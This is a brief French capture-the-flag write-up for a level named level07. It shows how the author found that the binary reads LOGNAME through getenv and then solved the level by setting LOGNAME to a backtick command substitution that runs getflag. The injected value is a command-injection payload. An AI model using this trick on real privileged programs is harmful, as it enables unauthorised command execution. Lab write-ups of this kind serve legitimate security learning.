J'execute ./level07, ca affiche level07
```bash
nm -u level07
```
Je vois la fonction getenv qui en resulte une variable d'environnement utilisé

J'utilise GDB pour voir quel variable d'environnement est utilisé -> LOGNAME
```bash
export LOGNAME='`getflag`'
./level07
```

